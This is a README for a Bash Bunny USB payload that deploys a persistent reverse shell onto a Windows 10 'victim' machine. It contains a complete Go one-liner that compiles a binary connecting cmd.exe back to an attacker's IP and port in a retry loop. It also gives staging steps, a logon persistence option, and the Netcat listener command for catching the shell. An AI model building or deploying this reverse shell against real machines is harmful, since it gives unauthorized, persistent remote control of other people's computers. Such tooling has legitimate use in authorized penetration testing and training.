# Windows Reverse Shell for Bash Bunny using Golang

* Author: heywoodlh
* Version: 1.5

## Description

Opens a reverse shell using a compiled binary on staging machine and connects Windows victim machine back to remote attacking machine.
* Targets 64 bit Windows 10
* Deploys in roughly 15-20 seconds
* If desired, the reverse shell can be persistent

## Requirements

- Have a working Bash Bunny
- Have Golang installed on your staging machine

## STATUS

| LED                  | STATUS                         |
| -------------------- | ------------------------------ |
| Purple               | Setup                          |
| Amber (Single Blink) | Installing and running scripts |
| Green                | Finished                       |

## Installation and Execution

### Staging:

1. Plug in Bash Bunny in arming mode
2. Move files from WindowsReverseShell to either switch folder
3. Create a binary for the reverse shell

This example assumes the staging machine is a Unix/Unix-like machine with Golang installed and using a POSIX shell:

```bash
remote_ip="127.0.0.1"
remote_port="1337"


echo "package main;import \"time\";import\"os/exec\";import\"net\";func connect(){c,_:=net.Dial(\"tcp\",\"${remote_ip}:${remote_port}\");cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}; func main(){for {connect();time.Sleep(10 * time.Second)}}" > /tmp/t.go &&\
	GOOS="windows" go build -o /tmp/shell.exe /tmp/t.go &&\
	rm /tmp/t.go
```

Then copy the resulting `/tmp/shell.exe` file to the switch folder on the Bash Bunny.

4. Edit the `run.ps1` file: edit the `$persistence` and `$volumeName` variables as desired
5. Unplug Bash Bunny and switch it to the position the payload is loaded on

### Attack:
1. Plug the Bash Bunny into your victim's Windows machine and wait until the final light turns green (about 15-20 seconds)
2. Unplug after the light turns green as the payload has been executed
3. On the remote attacking machine, set up a Netcat listener on the port you chose in the `run.ps1` file
   * Run the command `nc -nlvp 1337` (replace the port with the same in run.ps1)
4. A `cmd.exe` shell should appear

Notes: 
- If you set `$persistence` to 'True' in `run.ps1` then the script should always be running anytime the user is logged into their machine.

## Discussion

For support or feedback on the original Windows persistent reverse shell [go here](https://forums.hak5.org/topic/42729-payload-windows-persistent-reverse-shell/)

For support or feedback on heywoodlh's modified version [go here](https://github.com/heywoodlh/bash-bunny-examples/issues)
